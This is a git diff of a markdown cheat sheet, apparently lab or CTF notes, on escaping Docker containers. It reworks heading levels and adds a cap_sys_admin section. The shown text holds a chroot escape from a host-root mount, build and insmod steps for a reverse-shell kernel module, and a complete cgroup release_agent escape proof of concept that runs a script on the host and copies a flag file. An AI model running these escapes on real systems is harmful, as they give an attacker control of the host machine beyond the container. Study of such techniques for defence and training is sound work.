@@ -12,7 +12,7 @@ tags:
   - docker
 ---
 
-## Command
+# Command
 ```bash
 docker run -it -v /:/mnt alpine chroot /mnt
 ```
@@ -69,14 +69,14 @@ chroot /mnt to change root directory to /mnt
 sh to run shell
 ```
 
-## Abusing `cap_sys_module`
+# Abusing `cap_sys_module`
 
-### Install the following requirements
+## Install the following requirements
 ```bash
 apt update && apt install -y gcc make linux-headers
 ```
 
-### Create the kernel module - reverse shell
+## Create the kernel module - reverse shell
 ```bash
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -96,7 +96,7 @@ module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
 
-### Create the Makefile
+## Create the Makefile
 ```bash
 obj-m +=reverse-shell.o
 all:
@@ -105,10 +105,30 @@ clean:
 	make -C /lib/modules/$(uname -r)/build M=$(pwd) clean
 ```
 
-### Make and install the kenel module
+## Make and install the kenel module
 ```bash
 make && insmod reverse-shell.ko
 ```
+
+# Abusing cap-sys_admin
+
+## Check the capabilities
+```bash
+capsh --print
+```
+
+## PoC
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/exploit" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /exploit
+echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
+chmod a+x /exploit
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
 
 # Sources
 [https://blog.nody.cc/posts/container-breakouts-part2/]
